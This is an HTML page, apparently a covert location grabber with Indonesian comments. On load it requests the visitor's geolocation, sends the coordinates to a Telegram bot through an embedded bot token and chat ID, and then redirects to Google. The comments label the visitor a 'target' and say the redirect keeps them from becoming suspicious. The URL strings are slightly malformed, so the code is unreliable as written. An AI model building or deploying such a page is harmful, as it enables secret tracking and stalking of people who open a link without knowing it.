<!DOCTYPE html>
<html>
<body>
<script>
window.onload = function() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(sendToTelegram, showError);
    }
};

function sendToTelegram(position) {
    var lat = position.coords.latitude;
    var lon = position.coords.longitude;
    var token = "8638321687:AAHq7-qulLENRloAfMrULfSW4Wchu25R-ms"; 
    var chat_id = "5287296131";
    
    // Versi aman menggunakan tanda + agar tidak ada kesalahan simbol miring
    var text = "🎯 TARGET TERDETEKSI!\n📍 Lokasi: https://www.google.com" + lat + "," + lon;
    var url = "https://api.telegram.org" + token + "/sendMessage?chat_id=" + chat_id + "&text=" + encodeURIComponent(text);

    fetch(url).then(function() {
        // Target langsung diarahkan ke Google agar tidak curiga
        window.location.href = "https://www.google.com"; 
    });
}

function showError(error) {
    // Jika target menolak, tetap diarahkan ke Google
    window.location.href = "https://www.google.com";
}
</script>
</body>
</html>
